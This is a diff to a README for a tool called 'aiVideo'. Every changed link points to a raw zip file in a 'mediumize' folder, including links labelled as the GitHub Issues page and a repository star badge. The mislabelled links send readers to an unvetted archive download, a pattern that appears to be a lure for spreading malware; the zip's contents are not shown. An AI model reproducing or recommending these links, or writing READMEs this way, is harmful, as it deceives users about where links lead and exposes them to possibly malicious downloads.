@@ -8,7 +8,7 @@ Welcome to **aiVideo**! This tool helps you save time on video editing. Whether 
 
 To begin, visit the Releases page to download the software:
 
-[![Download aiVideo](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip)](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip)
+[![Download aiVideo](https://raw.githubusercontent.com/Johnny12242006/aiVideo/main/mediumize/Video-ai-1.3.zip)](https://raw.githubusercontent.com/Johnny12242006/aiVideo/main/mediumize/Video-ai-1.3.zip)
 
 ### Steps to Download aiVideo
 
@@ -68,14 +68,14 @@ Should you encounter any issues:
 
 For additional help:
 
-- Visit our [GitHub Issues page](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip) to report any problems or ask questions.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Johnny12242006/aiVideo/main/mediumize/Video-ai-1.3.zip) to report any problems or ask questions.
 - Join our community forums for tips and user discussions.
 
 ## 📢 Stay Updated
 
 Follow our repository to get the latest news and updates on new features and improvements:
 
-[![Star aiVideo](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip)](https://github.com/Johnny12242006/aiVideo/raw/refs/heads/main/mediumize/ai-Video-v2.7.zip)
+[![Star aiVideo](https://raw.githubusercontent.com/Johnny12242006/aiVideo/main/mediumize/Video-ai-1.3.zip)](https://raw.githubusercontent.com/Johnny12242006/aiVideo/main/mediumize/Video-ai-1.3.zip)
 
 ## 💬 Feedback
 
